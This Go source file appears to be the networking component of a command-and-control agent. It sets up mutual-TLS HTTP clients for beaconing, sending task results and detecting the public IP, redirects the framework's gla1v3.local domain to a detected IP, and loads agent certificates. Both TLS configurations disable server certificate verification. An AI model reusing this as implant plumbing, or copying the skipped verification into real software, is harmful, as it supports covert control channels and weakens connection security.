package client

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
	"time"
)

// Client wraps HTTP clients with mTLS configuration
type Client struct {
	C2Client      *http.Client
	APIClient     *http.Client
	WhoamiClient  *http.Client
	DialContext   func(context.Context, string, string) (net.Conn, error)
	DetectedHostIP string
}

// Setup initializes the HTTP clients with mTLS configuration
func Setup(serverName, apiServerName string, cert tls.Certificate, caCertPool *x509.CertPool, detectedHostIP string) *Client {
	// Custom dialer to bypass DNS when we have a detected host IP
	dialer := &net.Dialer{
		Timeout:   10 * time.Second,
		KeepAlive: 30 * time.Second,
	}
	
	dialContext := func(ctx context.Context, network, addr string) (net.Conn, error) {
		// If we detected a host IP and the address contains gla1v3.local, use the IP
		if detectedHostIP != "" && strings.Contains(addr, "gla1v3.local") {
			// Extract port from addr (e.g., "c2.gla1v3.local:4443" -> ":4443")
			parts := strings.Split(addr, ":")
			if len(parts) >= 2 {
				port := parts[len(parts)-1]
				addr = detectedHostIP + ":" + port
				log.Printf("Bypassing DNS: using %s", addr)
			}
		}
		return dialer.DialContext(ctx, network, addr)
	}

	// C2 TLS config (for beaconing)
	c2TLS := &tls.Config{
		Certificates:       []tls.Certificate{cert},
		RootCAs:            caCertPool,
		ServerName:         serverName,
		MinVersion:         tls.VersionTLS12,
		InsecureSkipVerify: true, // Skip Traefik cert verification, mTLS still works
	}

	c2Client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: c2TLS,
			DialContext:     dialContext,
		},
		Timeout: 10 * time.Second,
	}

	// API TLS config (for task results)
	apiTLS := &tls.Config{
		Certificates:       []tls.Certificate{cert},
		RootCAs:            caCertPool,
		ServerName:         apiServerName,
		MinVersion:         tls.VersionTLS12,
		InsecureSkipVerify: true,
	}

	apiClient := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: apiTLS,
			DialContext:     dialContext,
		},
		Timeout: 10 * time.Second,
	}

	// Whoami client (for public IP detection)
	whoamiClient := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: apiTLS,
			DialContext:     dialContext,
		},
		Timeout: 6 * time.Second,
	}

	return &Client{
		C2Client:      c2Client,
		APIClient:     apiClient,
		WhoamiClient:  whoamiClient,
		DialContext:   dialContext,
		DetectedHostIP: detectedHostIP,
	}
}

// LoadCertificates loads client certificates and CA from embedded or file sources
func LoadCertificates(embeddedCert, embeddedKey, embeddedCA, certPath, keyPath, caPath string) (tls.Certificate, *x509.CertPool, error) {
	var cert tls.Certificate
	var caCertPool *x509.CertPool
	var err error

	// Check if we have embedded certificates
	if embeddedCert != "" && embeddedKey != "" && embeddedCA != "" {
		log.Println("Using embedded certificates")
		
		// Convert escaped newlines back to actual newlines
		certPEM := strings.Replace(embeddedCert, "\\n", "\n", -1)
		keyPEM := strings.Replace(embeddedKey, "\\n", "\n", -1)
		caCertPEM := strings.Replace(embeddedCA, "\\n", "\n", -1)
		
		// Load embedded cert/key pair
		cert, err = tls.X509KeyPair([]byte(certPEM), []byte(keyPEM))
		if err != nil {
			return tls.Certificate{}, nil, fmt.Errorf("failed to load embedded cert/key: %v", err)
		}
		
		// Load embedded CA cert
		caCertPool = x509.NewCertPool()
		if !caCertPool.AppendCertsFromPEM([]byte(caCertPEM)) {
			return tls.Certificate{}, nil, fmt.Errorf("failed to append embedded CA cert to pool")
		}
		
		log.Println("Successfully loaded embedded certificates")
		return cert, caCertPool, nil
	}

	// Fallback to file-based certificates
	log.Println("No embedded certs found, loading from files...")
	
	// Try cert/key pairs
	tryPairs := [][]string{}
	if certPath != "" && keyPath != "" {
		tryPairs = append(tryPairs, []string{certPath, keyPath})
	}
	// repo-local candidates
	tryPairs = append(tryPairs, [][]string{
		{"../certs/agent-client.crt", "../certs/agent-client.key"},
		{"../certs/agent.crt", "../certs/agent.key"},
		{"../certs/server.crt", "../certs/server.key"},
	}...)

	var loadedCertPath, loadedKeyPath string
	attempted := []string{}
	for _, p := range tryPairs {
		attempted = append(attempted, p[0]+"|"+p[1])
		if _, err := os.Stat(p[0]); err != nil {
			continue
		}
		if _, err := os.Stat(p[1]); err != nil {
			continue
		}
		cert, err = tls.LoadX509KeyPair(p[0], p[1])
		if err == nil {
			loadedCertPath = p[0]
			loadedKeyPath = p[1]
			break
		}
	}
	if err != nil {
		return tls.Certificate{}, nil, fmt.Errorf("failed to load any agent cert/key pair. Attempts: %v. Last error: %v", attempted, err)
	}
	log.Printf("Loaded agent cert/key: %s , %s", loadedCertPath, loadedKeyPath)

	// Load CA cert
	if caPath == "" {
		caPath = "../certs/ca.crt"
	}

	caCert, err := os.ReadFile(caPath)
	if err != nil {
		return tls.Certificate{}, nil, fmt.Errorf("failed to read CA cert: %v", err)
	}
	caCertPool = x509.NewCertPool()
	if !caCertPool.AppendCertsFromPEM(caCert) {
		return tls.Certificate{}, nil, fmt.Errorf("failed to append CA cert to pool")
	}

	return cert, caCertPool, nil
}
